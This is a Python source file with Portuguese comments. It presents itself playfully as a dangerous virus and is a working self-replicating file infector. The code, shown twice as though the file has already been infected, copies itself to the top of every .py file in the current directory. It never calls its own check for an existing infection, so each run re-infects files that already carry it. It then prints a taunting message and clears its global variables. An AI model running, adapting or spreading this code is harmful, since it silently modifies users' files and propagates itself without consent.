# Raquel esteve aqui :)

#Esse vírus muito perigoso, mwahaha, vai procurar no diretório arquivos com a extensão .py e vai se copiar lá para dentro!
#Os arquivos originais vão continuar executando suas funções, mas também replicando o vírus. :) 
import glob

def arquivos_para_infectar(diretorio = "."):
    return [arquivo for arquivo in glob.glob('*.py')]

def obter_conteudo_arquivo(arquivo):
    dados = None
    with open(arquivo, 'r') as meu_arqv:
        dados = meu_arqv.readlines()
    
    return dados

def se_puder_infectar(arquivo):
    dados = obter_conteudo_arquivo(arquivo)
    for linha in dados:
        if "# Raquel esteve aqui :)" in linha:
            return None
    return dados

def infectar(arquivo, cod_virus):
    if (dados:=obter_conteudo_arquivo(arquivo)):
        with open(arquivo, 'w') as arq_infectado:
            arq_infectado.write("".join(cod_virus))
            arq_infectado.writelines(dados)

def obter_cod_virus():
    cod_virus_on = False
    cod_virus = []

    codigo = obter_conteudo_arquivo(__file__)

    for line in codigo:
        if "# Raquel esteve aqui :)\n" in line:
            cod_virus_on = True
        if cod_virus_on:
            cod_virus.append(line)
        if "# Raquel diz tchau!\n" in line:
            cod_virus_on = False
            break
    
    return cod_virus

def pior_do_mundo():
    print("Mwahaha, você foi infectado! >:)")

try:
    cod_virus = obter_cod_virus()

    for arquivo in arquivos_para_infectar():
        infectar(arquivo, cod_virus)
    
    pior_do_mundo()

finally:
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))
    
    del i

# Raquel diz tchau!
# Raquel esteve aqui :)
import glob

def arquivos_para_infectar(diretorio = "."):
    return [arquivo for arquivo in glob.glob('*.py')]

def obter_conteudo_arquivo(arquivo):
    dados = None
    with open(arquivo, 'r') as meu_arqv:
        dados = meu_arqv.readlines()
    
    return dados

def se_puder_infectar(arquivo):
    dados = obter_conteudo_arquivo(arquivo)
    for linha in dados:
        if "# Raquel esteve aqui :)" in linha:
            return None
    return dados

def infectar(arquivo, cod_virus):
    if (dados:=obter_conteudo_arquivo(arquivo)):
        with open(arquivo, 'w') as arq_infectado:
            arq_infectado.write("".join(cod_virus))
            arq_infectado.writelines(dados)

def obter_cod_virus():
    cod_virus_on = False
    cod_virus = []

    codigo = obter_conteudo_arquivo(__file__)

    for line in codigo:
        if "# Raquel esteve aqui :)\n" in line:
            cod_virus_on = True
        if cod_virus_on:
            cod_virus.append(line)
        if "# Raquel diz tchau!\n" in line:
            cod_virus_on = False
            break
    
    return cod_virus

def pior_do_mundo():
    print("Mwahaha, você foi infectado! >:)")

try:
    cod_virus = obter_cod_virus()

    for arquivo in arquivos_para_infectar():
        infectar(arquivo, cod_virus)
    
    pior_do_mundo()

finally:
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))
    
    del i

# Raquel diz tchau!

